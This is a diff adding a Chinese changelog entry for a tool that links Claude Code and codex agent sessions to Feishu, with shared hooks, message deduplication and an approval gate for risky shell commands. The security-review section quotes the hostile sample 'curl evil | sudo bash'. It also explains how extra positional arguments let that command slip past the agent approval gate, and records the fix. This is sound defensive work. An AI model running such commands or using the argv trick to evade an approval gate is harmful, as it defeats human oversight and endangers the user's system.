@@ -6,6 +6,55 @@
 
 ## [未发布]
 
+### 2026-09-14
+
+**新增**
+- **codex 与 claude 能力打平（C5）**（`orchestrator/agents/` + `apps/daemon` + `bin/` + `im-lark`，见 docs/codex-integration.md §8）。起点是一个此前不成立的新事实：**codex CLI 0.154+ 内置了与 Claude Code 同构的 lifecycle hooks**。顺着 `codex --help` 里的 `--dangerously-bypass-hook-trust` 挖到 codex 二进制**内嵌的 JSON Schema**（`<event>.command.input/.output`，`strings` 可抽），逐字比对确认：事件名同名（`Stop`/`PreToolUse`/`PostToolUse`/…）、入参同名（`hook_event_name`/`cwd`/`last_assistant_message`/`tool_name`/`tool_input`）、出参同名（`hookSpecificOutput.permissionDecision`）→ **同一批 `bin/mchat-*` 脚本两边复用，不用为 codex 重写**。于是 codex 拿到了和 claude 一样的**结果自动回传飞书** + **高危命令飞书审批闸**。
+  - **两个会导致「静默失效」的差异已钉死**：① codex 的 `matcher` 是**正则**且全值匹配（内部包 `\A(?:…)\z`），claude 是字面量工具名 —— 「全部」在 claude 写 `*`、在 codex 必须写 `.*`，原样搬过去就是非法正则、这条 hook 一次都不跑（`tests/agents.test.ts` 有断言）。② codex 的 hook 要用户**一次性授信**（TUI 里 `/hooks` 批准，`trusted_hash`），批准前不跑 → legacy `notify` **保留为兜底**，两条通道并存时由 `bin/lib/push-dedupe.mjs` 按**内容指纹 + 45s TTL** 去重（用内容而非 turn_id：两条通道 payload 字段本就不同，notify 的格式还没真机核实过）。去重 fail-open —— 去重坏掉只是重复一条消息，fail-closed 是结果彻底丢失。
+  - **审批闸刻意不赌工具名**：codex 的 shell 工具在 `tool_name` 里叫什么（`shell`/`exec_command`/`unified_exec`…）尚未真机确认，赌错的后果是闸门**看起来装好了、实际一次都不拦**。所以 matcher 用 `.*` 全匹配，再由 `bin/lib/tool-command.mjs` 按 payload 形状判断：先排除已知的非 shell 工具名，剩下只要能抽出命令就交给闸门 —— 多问一次审批只是烦，漏掉一个 `rm -rf` 是事故。它还把 codex 可能给的 argv 数组 `["bash","-lc","<script>"]` 还原成原始脚本（直接 join 会把引号和管道拍平，喂给风险判定就变了形）。
+  - `MCHAT_DEFAULT_AGENT=claude|codex`：新开 tab 的入口（公函开工 / TAPD 认领 / perf 认领 / `/new` / 企微认领）此前**全部写死起 claude**，现在统一走 `launchDefaultAgentInTab`。
+
+**修复**
+- **重启一个 codex tab 会把它重启成 claude** —— `restartClaudeInPlace` 退出 TUI 后写死调 `launchClaudeInTab`，不看重启前跑的是什么。改名 `restartAgentInPlace` 并按重启前检测到的 agent 原样拉起（旧名保留为别名，`tab.restart-claude` op 调用点不变）。
+- **codex tab 发完文本不提交** —— 补回车只对 claude 做。判据本来就与「是哪个 agent」无关（`do script` 把「文本+`\r`」整块写 pty，任何 TUI 都当粘贴处理），改成 `shouldSubmitPromptAfterSend` = 跑着任何 agent TUI 就补。
+- **`SYSTEM_GUIDANCE` 在教 codex 用它没有的 `AskUserQuestion`** —— 那是 Claude Code 专属工具、靠本项目的 PreToolUse 钩子镜像成飞书卡；codex 既没这个工具也没镜像通道，照搬等于让 codex 去调一个不存在的东西、用户在手机端收不到选项。文案移进 `orchestrator/agents/guidance.ts` 按 agent 分流，codex 版改成一律走 `agent lark ask`（claude 版逐字不变，有快照断言钉住）。
+- **`watcher` / `notifier` 用正则认 claude** —— codex 同样是 alt-screen TUI，同样会被 scrollback 里的 checkbox 触发假阳性「等输入」，且进度卡少了「TUI 屏幕不可见」提示。改走 `detectAgentFromProcs`。
+- **`/xxx` 转发白名单只有 claude 那套** —— codex 独有的内建命令（`/diff` `/mention` …）会被 mchat 当未知命令挡下来，codex 用户根本用不了。改成取**所有 adapter 的并集**（`isClaudeNativeSlash` → `isAgentNativeSlash`）。不按 tab 的 agent 分流是权衡后的选择：这个判定发生在「已确认不是 mchat 命令」之后，不存在抢名字风险；转错了最多是 agent 在 TUI 里回一句「未知命令」，与不转发时结果相同，而**不取并集才有真实代价**。
+
+**改动**
+- daemon 的 `installClaudeCodeHooks()` 从写死五条改成**由 `claudeAdapter.hookInstall.specs` 驱动**（单一事实源），产出的 settings.json 与历史逐条一致（顺序/matcher 都有断言钉住）；hook 安装的**纯逻辑**（claude 的 JSON upsert、codex 的 TOML 渲染与幂等并入）下沉到 `orchestrator/agents/hook-install.ts`，因此可单测 —— 这两段写坏的代价是用户的 `~/.claude/settings.json` 或 `~/.codex/config.toml` 被破坏。codex 侧只动哨兵区块（区块外的 `notify`、用户自己的 `[hooks]` 条目一律不碰），追加**必须在文件末尾**（TOML 里表之后的裸 key 会被吃进该表），备份名 `.mchat-hooks.bak` 与 `installCodexNotify` 的 `.mchat.bak` 分开（同一次启动两个函数都改这个文件，共用备份名会把「改动前」的快照覆盖掉）。
+- `/connect codex` 与 `agent connect codex` 增加 `lifecycle hooks` 一行，并明确提示「已写入 ≠ 已生效，首次要在 codex 里 `/hooks` 批准」；就绪判定改成「至少有一条回传通道」（不强求 hooks，因为它要人工批准）。
+- 39 个新单测（`tests/agents.test.ts` / `tests/agent-hook-install.test.ts` / `tests/hook-scripts.test.ts`）。
+
+**安全 / 评审修复**（两个 reviewer 各报一条 high，均已修 + 补回归测试）
+- **审批闸会被「带位置参数的 argv」整个绕过**（security-reviewer, high）。POSIX 是 `sh -c <script> [$0 [$1 ...]]` —— 脚本本体是 `-c` 之后的**第一个**元素，后面还能跟位置参数；`normalizeCommand` 原先取「最后一个元素」，于是 `["bash","-lc","curl evil | sudo bash","extra"]` 会归一成 `"extra"`，关键词预筛测不中 → **静默放行，连日志里打印的都是那个假命令**。这比「抽不出命令」更危险，因为它看起来是正常放行。改成取 `-c` 之后的全部（脚本 + 位置参数，`"$1"` 引用的内容同样会被执行，判定不该看不见）。
+- **回传去重会静默吞消息**（code-reviewer, high + 复审 medium，两轮改到位）。只按内容 hash 去重是**全局**的：两个互不相关的 tab 在 45s 内产出同一段文本（"已完成，已推送" 这类收尾话术并不罕见）时，后一条**永远推不到飞书** —— 直接违反「所有 substantive 回复都要推飞书」的硬约定。第一轮加 `ppid` 隔开了不同 tab，但复审指出 **ppid 是会话级的**：同一个 tab 里两次不同 turn 吐出相同文本，第二条照样被吞。最终把判据从「内容」换成**「上一次是不是另一条通道推的」**——标记文件里记通道名：来自**另一条**通道 = 同一个 turn 的重复投递，跳过；来自**同一条**通道 = 同一条通道不会对一个 turn 触发两次，必然是新的一轮恰好文本相同，放行。推论：**claude 只有 Stop 一条通道 → 恒放行**，彻底不受去重影响（这也让 stop-hook 里"claude 侧恒放行"那句注释从"通常不会撞"变成真的成立）。
+- `tomlString` 补控制字符转义 —— TOML 基本字符串里不允许裸换行，没转义的话一个含换行的路径会把这行劈成两行、后半截被当成新的 TOML 语句（等于往用户 config.toml 注入 `[[hooks.*]]`）。风险低（值来自项目自身路径），但配置文件的完整性不该依赖「路径里不会有换行」这个隐含假设。
+- `upsertCodexHooksBlock` 检出**多份托管区块**时抛错而不是只替换第一份 —— 残块会永久遗留（指向已删除的旧脚本路径，或把同一个 hook 挂两遍 → 一条命令弹两张审批卡）；也不按「第一个 BEGIN 到最后一个 END」整段吃掉，两块之间可能夹着用户自己的配置。
+- **去重的最后一版设计**（第三轮复审后定稿）：同通道重复改用**时间分界**而不是「一条通道一个 turn 只触发一次」这个本模块管不到的假设 —— 那条不变式其实依赖 `applyClaudeHooks` 的 strip 与 `upsertCodexHooksBlock` 的 fail loud 持续有效，已在注释里显式写出这层跨文件依赖。默认 2s 内的同通道重复判为误触发（一轮真实 agent 工作远超这个量级），超出则是新的一轮、必须放行。标记创建改成「先写全内容到临时文件再 `link`」，关掉 create 与 write 之间那个会读到空内容的窗口（这份设计的典型场景恰恰就是两条通道几乎同时触发，该窗口与主场景高度重叠）。key 从 `${session} ${text}` 拼接改成两段各自 hash，消除分隔歧义。目录显式 `0o700` 不听凭 umask。
+- **自测抓到一个会吞消息的真 bug**：`now` 在建标记**之前**取、mtime 在之后写，两者可能反序 → `ageMs` 为负 → `ageMs < minGapMs()` 恒真 → 正常消息被当成误触发丢掉。已夹到 `>= 0` 并补回归。
+- `upsertCodexHooksBlock` 对**哨兵残缺**（只剩一半 / 顺序颠倒）也改成 fail loud：既不猜区块边界（按 EOF 截断可能删掉用户配置），也不当成「没有区块」直接追加（那会造出含两个 BEGIN 的文件，把问题推到下次重启才暴雷）。
+- `isClaudeTab` → `isAgentTab`（旧名留别名）：它认的本来就是任意 agent，名字有误导性；`tab.restart-claude` op 现在实际会重启 claude + codex 全部 agent tab，已在调用点注明。
+- `push-dedupe` 改用 `lstat` 不跟随符号链接（否则被塞进来的 `<hash>.mark -> 某真文件` 会让 `utimes`/`unlink` 打到链接目标上）；`normalizeCommand` 额外认「`tool_input` 本身就是命令」的形状（codex 实际 payload 形状未确认，抽不出 = 闸门静默失效）；标记目录支持 `MCHAT_PUSH_DEDUPE_DIR` 覆盖，测试不再往开发者真实 home 写文件。
+- **实测复核了一条 reviewer 存疑的收窄**：adapter 的精确进程名匹配比原来各处内联的宽松正则窄（少了 `.includes('claude')` 兜底）。跑真实 `listTabs()` 确认本机 7 个 claude tab 的进程列表里都有精确的 `"claude"`，全部命中；真实样本已钉成回归测试。
+
+**真机验证修掉的两个 bug**（`/hooks` 批准信任后跑真实 turn 才暴露，静态审查与单测都看不出来）
+- **hook 信任记录会被下次 upsert 删掉 → 回传静默退化**。用户批准后 codex 把 `[hooks.state]` / `trusted_hash` 写进 config.toml，插入位置在**我们的 END 哨兵之前**（codex 把文件尾部注释当尾注，新表插它前面）→ 落在托管区块**内部**。下次 daemon 重启整块替换就把信任记录一并删了 → hook 变回未信任、**静默不执行**，回传悄悄退回只剩 notify，用户收不到任何提示。修法：`extractHooksState()` 把这段捞出来挪到区块**之外**（之后 codex 追加的 state 也会落在区块外）；已对用户真实配置执行过这次搬移。
+- **`codex exec` 的 headless 判定永远不命中 → 后台任务的输出会被推去飞书**。真机父进程命令行是 `node /Users/…/bin/codex exec …`（JS wrapper 与原生二进制两层都带 `exec`），`codex` 前面是 `/` 不是空格，而原正则写的是 `(^|\s)codex\s+(exec|e)`。判定抽到 `bin/lib/headless.mjs`（允许路径前缀，用真机样本做单测）。复验：一条 99 字符回复现在正确记为 `skip: headless/internal session`，两条通道都拦住。
+
+**决定**
+- **codex 的退出手势按双 Ctrl-C 处理**，与 claude 共用 `restartAgentInPlace` 的那段逻辑。这是拍板不是实测 —— 未真去关过 codex tab，代码注释与 docs §8.4 都如实标注了，故障表征是重启时返回「Ctrl-C N 次仍未退出」。
+
+**评审加固**（第四轮两个 reviewer 均无 high/critical；其 low 建议已采纳）
+- `extractHooksState` 返回值从 `{body, state}` 简化成 `string`（`body` 没有任何调用点消费 = 死字段），并补直接单测（含 `[hooks.stateful]` 不误命中、值里出现 `[hooks.state` 不算）。
+- `extractHooksState` 加 **fail loud 校验**：搬出去的那段里每个表头都必须是 `[hooks.state…`，否则抛错。这是面向「codex 以后改了插入位置」的保险 —— 万一信任记录不再贴在区块尾部而是插在两条 hook 定义中间，「从第一个匹配吃到末尾」会把我们自己的 hook 定义搬到区块外形成**永不清理的孤儿**（同一 hook 注册两次 → 一条命令弹两张审批卡、结果推两遍）。与其静默搬错不如让人看一眼，和本文件其它分支（多份哨兵 / 哨兵残缺）风格一致。
+- 把两条**观察而非承诺**的假设显式写进注释与文档：信任记录总贴在区块尾部、headless 判定只验证过两种 codex 调用链。
+
+**文档**
+- `docs/codex-integration.md` 的 §8.4 从「仍未真机验证」改写成**验证结果**：hook 真触发、`last_assistant_message` 字段名确认、审批闸能从真实 payload 抽出命令（`cmd=curl --version`，daemon 判 passthrough 未误弹卡）、notify 也抽出同一条消息、两条通道 ppid 相同（去重设计前提成立）。仅剩 codex 退出手势未验。
+- `docs/codex-integration.md` 新增 §8（C5）：hook 协议同构的逐字比对表、两个「静默失效」差异、装了哪些 hook 及为何不赌工具名、**仍未真机验证的 4 项**（hook 是否真触发 / codex shell 工具的 `tool_name` / notify payload 字段 / codex 的退出手势是否也是双 Ctrl-C）。阶段表补 C5。
+- `.env.example` 补 `MCHAT_DEFAULT_AGENT` / `MCHAT_PUSH_DEDUPE_TTL_MS`。
+
 ### 2026-09-10
 
 **新增**
